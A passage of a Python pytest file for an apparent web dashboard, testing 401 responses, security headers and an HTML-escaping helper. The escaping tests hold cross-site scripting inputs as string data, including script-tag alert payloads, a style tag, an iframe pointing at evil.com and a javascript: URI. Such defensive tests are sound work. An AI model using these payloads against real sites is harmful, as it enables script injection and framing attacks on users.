        assert r.status_code == 200
        assert "text/html" in r.headers.get("content-type", "")

    @pytest.mark.asyncio
    async def test_401_returns_json(self, dashboard_client):
        r = await dashboard_client.get("/api/stats")
        assert r.status_code == 401
        body = r.json()
        assert "detail" in body


class TestQA5CSPAndSecurityHeaders:
    """Verify security headers on all response types."""

    @pytest.mark.asyncio
    async def test_csp_header_present(self, dashboard_client):
        r = await dashboard_client.get("/api/health", headers=_auth())
        csp = r.headers.get("content-security-policy", "")
        assert "default-src 'self'" in csp

    @pytest.mark.asyncio
    async def test_x_frame_options_deny(self, dashboard_client):
        r = await dashboard_client.get("/", headers=_auth())
        assert r.headers["x-frame-options"] == "DENY"

    @pytest.mark.asyncio
    async def test_referrer_policy_no_referrer(self, dashboard_client):
        r = await dashboard_client.get("/api/stats", headers=_auth())
        assert r.headers["referrer-policy"] == "no-referrer"


class TestQA5HtmlEscapeEdgeCases:
    """Verify _esc handles tricky HTML injection payloads."""

    def test_esc_nested_html(self):
        assert "<" not in _esc("<<script>>alert(1)<</script>>")

    def test_esc_ampersand_entity(self):
        result = _esc("&amp;")
        assert "&amp;amp;" in result  # double-escaped is correct

    def test_esc_style_tag(self):
        assert "<style" not in _esc("<style>body{background:red}</style>")

    def test_esc_iframe_injection(self):
        assert "<iframe" not in _esc('<iframe src="https://evil.com"></iframe>')

    def test_esc_javascript_uri(self):
        result = _esc('javascript:alert(1)')
        # javascript: URIs are text, not HTML tags — _esc handles <>"& only
        # This is fine because in the dashboard template, values go through esc()
        assert result == "javascript:alert(1)"
